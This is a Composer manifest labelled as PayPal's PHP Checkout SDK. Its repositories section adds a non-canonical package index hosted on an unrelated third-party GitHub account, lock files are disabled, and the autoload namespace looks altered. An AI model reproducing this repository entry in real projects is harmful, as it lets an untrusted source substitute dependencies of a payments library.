{
    "name": "paypal/paypal-checkout-sdk",
    "description": "PayPal's PHP SDK for Checkout REST APIs",
    "keywords": [
        "paypal",
        "payments",
        "rest",
        "sdk",
        "orders",
        "checkout"
    ],
    "type": "library",
    "license": "Apache-2.0",
    "homepage": "http://github.com/paypal/Checkout-PHP-SDK/",
    "repositories": [
        {
            "type": "composer",
            "url": "https://raw.githubusercontent.com/Training-Datasmith/composer-index/remote-test-2026-11-09",
            "canonical": false
        }
    ],
    "require": {
        "php": ">=8.1",
        "ext-curl": "*",
        "paypal/paypalhttp": "1.0.1"
    },
    "authors": [
        {
            "name": "PayPal",
            "homepage": "https://github.com/paypal/Checkout-PHP-SDK/contributors"
        }
    ],
    "require-dev": {
        "phpunit/phpunit": "^9.6.33"
    },
    "autoload": {
        "psr-4": {
            "Pay_Pal_Checkout_Sdk\\": "lib/PayPalCheckoutSdk",
            "Sample\\": "samples/"
        }
    },
    "autoload-dev": {
        "psr-4": {
            "Test\\": "tests/"
        }
    },
    "scripts": {
        "pins": "php scripts/check-cluster-pins.php",
        "integration": [
            "@pins",
            "phpunit --testsuite integration"
        ],
        "test": "@integration"
    },
    "config": {
        "lock": false,
        "sort-packages": true
    }
}
